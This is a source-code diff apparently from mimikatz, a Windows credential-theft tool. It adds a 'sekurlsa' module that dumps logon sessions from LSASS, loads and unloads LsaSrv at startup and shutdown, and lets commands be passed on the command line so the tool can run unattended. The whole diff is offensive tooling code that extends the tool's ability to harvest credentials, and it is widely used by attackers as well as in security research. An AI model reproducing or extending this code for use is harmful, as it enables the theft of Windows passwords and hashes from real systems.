@@ -8,6 +8,7 @@
 bool mimikatz::initLocalModules()
 {
 	mod_system::getVersion(&mod_system::GLOB_Version);
+	mod_mimikatz_sekurlsa::loadLsaSrv();
 	
 	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"",			L"Standard", mod_mimikatz_standard::getMimiKatzCommands()));
 	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"crypto",		L"Cryptographie et certificats", mod_mimikatz_crypto::getMimiKatzCommands()));
@@ -26,27 +27,43 @@ bool mimikatz::initLocalModules()
 	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"inject",		L"Injecteur de librairies", mod_mimikatz_inject::getMimiKatzCommands()));
 	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"ts",			L"Terminal Server", mod_mimikatz_terminalserver::getMimiKatzCommands()));
 	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"divers",		L"Fonctions diverses n\'ayant pas encore assez de corps pour avoir leurs propres module", mod_mimikatz_divers::getMimiKatzCommands()));
+	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"sekurlsa",	L"Dump des sessions courantes par providers LSASS", mod_mimikatz_sekurlsa::getMimiKatzCommands()));
 	return true;
 }
 
-mimikatz::mimikatz(void) : Kmimikatz(NULL)
+mimikatz::mimikatz(vector<wstring> * mesArguments) : Kmimikatz(NULL)
 {
 	initLocalModules();
 	SetConsoleTitle(MIMIKATZ_FULL);
 	wcout << MIMIKATZ_FULL << L"\t/* Traitement du Kiwi (" << __DATE__ << L' ' << __TIME__ << L") */" << endl <<
 		L"// http://blog.gentilkiwi.com/mimikatz" << endl;
 
-	wstring * monBuffer = new wstring();
-	do
+	bool mustContinue = true;
+	if(mesArguments)
 	{
-		wcout << endl << MIMIKATZ << L" # " << dec;
-		getline(wcin, *monBuffer);
-	} while(tryToDispatch(monBuffer));
-	delete monBuffer;
+		for(vector<wstring>::iterator maCommande = mesArguments->begin(); mustContinue && (maCommande != mesArguments->end()); maCommande++)
+		{
+			wstring commande = *maCommande;
+			wcout << endl << MIMIKATZ << L"(commandline) # " << dec << commande << endl;
+			mustContinue = tryToDispatch(&commande);
+		}
+	}
+
+	if(mustContinue)
+	{
+		wstring * monBuffer = new wstring();
+		do
+		{
+			wcout << endl << MIMIKATZ << L" # " << dec;
+			getline(wcin, *monBuffer);
+		} while(tryToDispatch(monBuffer));
+		delete monBuffer;
+	}
 }
 
 mimikatz::~mimikatz(void)
 {
+	mod_mimikatz_sekurlsa::unloadLsaSrv();
 	mod_mimikatz_inject::closeThisCommunicator();
 }
 
